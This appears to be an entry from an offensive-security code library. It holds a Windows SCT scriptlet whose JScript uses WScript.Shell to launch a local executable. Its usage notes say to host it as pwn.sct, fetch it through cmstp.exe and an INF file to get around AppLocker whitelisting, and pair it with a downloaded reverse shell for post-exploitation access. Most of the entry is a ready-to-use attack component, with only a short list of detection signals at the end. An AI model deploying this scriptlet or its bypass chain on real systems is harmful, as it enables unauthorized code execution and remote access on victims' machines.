---
id: 40668990-4974-41a6-b069-3ddd946d17d2
type: code
name: pwn-sct-file-for-local-payload-launch
language: sct
verified: true
created_at: '2020-02-21T05:47:48.569970+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Windows
tags:
  - defense-evasion
  - scriptlet
validated: true
---

# pwn-sct-file-for-local-payload-launch

## Code

```sct
<?XML version="1.0"?>
<scriptlet>
<registration 
  progid="PoC"
  classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
      <![CDATA[
        var r = new ActiveXObject("WScript.Shell").Run("C:\\Windows\\Tasks\\shell.exe");

       ]]>
</script>
</registration>
</scriptlet>
```

## Description

This SCT (Script Component) file is a scriptlet that uses JScript to create an ActiveX WScript.Shell object and execute a local executable file. It is loaded remotely via INF processing to achieve arbitrary code execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| C:\\Windows\\Tasks\\shell.exe | Hardcoded path to the local payload executable; modify for different locations | C:\\Temp\\payload.exe |

## Usage

Host as pwn.sct on a web server. When fetched by cmstp.exe via INF, it executes the specified local file. Pair with a downloaded reverse shell exe for post-exploitation access.

## Detection

- AMSI scans for JScript in SCT files or scrobj.dll loads (Event ID 1 with scrobj.dll).
- PowerShell logging or ETW for WScript.Shell invocations.
- Unexpected executable launches from scriptlets.

## Related

- [[procedures/Windows-AppLocker-Whitelist-Bypass-via-cmstp]]
- [[codes/pwn-inf-file-for-remote-sct-execution]]
